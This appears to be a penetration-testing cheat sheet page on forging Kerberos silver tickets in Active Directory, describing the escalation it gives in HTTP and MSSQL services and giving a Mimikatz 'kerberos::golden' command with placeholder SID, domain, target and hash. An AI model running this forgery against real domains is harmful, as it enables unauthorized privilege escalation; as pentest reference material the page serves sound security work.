# Kerberos Silver  Tickets

Silver tickets allow you privilege escalation in context of a service, given that you know a service account hash.

#### HTTP

You get elevated Permissions in the Web Application.

#### MSSQL

You can become sql server administrator

Many others are described here: [https://adsecurity.org/?p=2011](https://adsecurity.org/?p=2011)

#### Create Silver Ticket:

Requirements: Domain SID \(`Get-ADDomain`\) & Service Account Hash

```text
kerberos::golden /sid:S-1-5-21-xxxxxxxxx-xxxxxxxxx-xxxxxxxxx/domain:test.local /ptt /id:1337 /target:web.test.local /service:http /rc4:... /user:xctadmin
```

